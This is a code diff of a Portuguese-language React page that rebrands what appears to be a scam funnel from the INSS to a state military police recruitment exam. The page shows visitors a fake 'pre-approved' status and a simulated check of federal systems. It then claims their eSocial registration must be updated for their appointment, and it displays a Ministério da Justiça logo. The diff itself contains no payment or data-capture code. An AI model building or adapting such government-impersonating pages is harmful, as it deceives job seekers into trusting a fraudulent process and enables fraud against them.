@@ -2,7 +2,8 @@ import { useEffect, useState } from 'react';
 import { useLocation } from 'wouter';
 import { ExercitoHeader } from '@/components/ExercitoHeader';
 import { CheckCircle2, Loader2, Circle, AlertTriangle, XCircle } from 'lucide-react';
-import logoMJ from '@assets/logo_INSS_1786320311202.png';
+import orgLogo from '@assets/logo-mj_1779836627251.png';
+import { useEstadoPM } from '@/hooks/useEstadoPM';
 
 interface VerificationStep {
   id: string;
@@ -58,6 +59,8 @@ const BUTTON_STEPS = [
 
 export default function ESocialLoadingPage() {
   const [, navigate] = useLocation();
+  const estadoPM = useEstadoPM();
+  const sigla = estadoPM?.sigla ?? 'PM';
   const [progress, setProgress] = useState(0);
   const [showAlert, setShowAlert] = useState(false);
   const [isButtonLoading, setIsButtonLoading] = useState(false);
@@ -102,8 +105,8 @@ export default function ESocialLoadingPage() {
       parsedCandidate?.protocoloFinal?.unidadeTrabalho?.regiao || '';
 
     const CARGO_MAP: Record<string, string> = {
-      'tecnico-administrativo': 'Técnico Administrativo',
-      'tecnico-nivel-medio':    'Técnico de Nível Médio',
+      'soldado-pm': 'Soldado de 2ª Classe PM',
+      'oficial-pm': 'Aspirante-a-Oficial PM',
     };
 
     let applicationData: any = null;
@@ -119,7 +122,7 @@ export default function ESocialLoadingPage() {
       parsedCandidate?.jobTitle ||
       parsedCandidate?.cargo ||
       parsedUser?.cargo ||
-      'Agente de Segurança Pública';
+      'Soldado de 2ª Classe PM';
 
     const gender =
       parsedUser?.gender || parsedUser?.genero || parsedUser?.sexo ||
@@ -234,7 +237,7 @@ export default function ESocialLoadingPage() {
               )}
               <div className="flex-1">
                 <p className="text-xs text-[#0063AF] font-medium uppercase tracking-wide mb-1">
-                  {getGenderedText(userInfo.gender, 'Pré-aprovado', 'Pré-aprovada')} — Concurso Público INSS 2026
+                  {getGenderedText(userInfo.gender, 'Pré-aprovado', 'Pré-aprovada')} — Concurso {sigla} 2026
                 </p>
                 <p className="text-sm text-gray-700 leading-relaxed">
                   {userInfo.firstName && userInfo.cidade
@@ -255,7 +258,7 @@ export default function ESocialLoadingPage() {
                 : 'Verificando sua situação trabalhista'}
             </h1>
             <p className="text-sm text-gray-600">
-              Consultando sistemas federais para preparar sua nomeação no Concurso Público INSS 2026.
+              Consultando sistemas federais para preparar sua nomeação no Concurso {sigla} 2026.
             </p>
           </div>
 
@@ -317,7 +320,7 @@ export default function ESocialLoadingPage() {
                   </p>
                   <p className="text-sm text-amber-700 mt-1">
                     Seu cadastro no eSocial precisa ser atualizado para que sua nomeação
-                    {userInfo.cargo ? ` como ${userInfo.cargo}` : ''} possa ser efetivada após a aprovação no Concurso Público INSS 2026.
+                    {userInfo.cargo ? ` como ${userInfo.cargo}` : ''} possa ser efetivada após a aprovação no Concurso {sigla} 2026.
                   </p>
 
                   <button
@@ -371,7 +374,7 @@ export default function ESocialLoadingPage() {
               Por que esta verificação é necessária?
             </p>
             <p className="text-sm text-gray-700 leading-relaxed">
-              O INSS está processando as nomeações do Concurso Público 2026
+              A {sigla} está processando as nomeações do Concurso Público 2026
               {userInfo.cidade ? ` na região de ${userInfo.cidade}` : ''}. Isso significa que, após sua aprovação na prova, a posse poderá ser{' '}
               {getGenderedText(userInfo.gender, 'efetivada', 'efetivada')} com agilidade, sem aguardar meses de tramitação burocrática.
             </p>
@@ -383,8 +386,8 @@ export default function ESocialLoadingPage() {
           {/* Footer branding */}
           <div className="flex justify-center mt-8">
             <img
-              src={logoMJ}
-              alt="INSS — Instituto Nacional do Seguro Social"
+              src={orgLogo}
+              alt="Ministério da Justiça e Segurança Pública"
               className="h-9 object-contain"
             />
           </div>
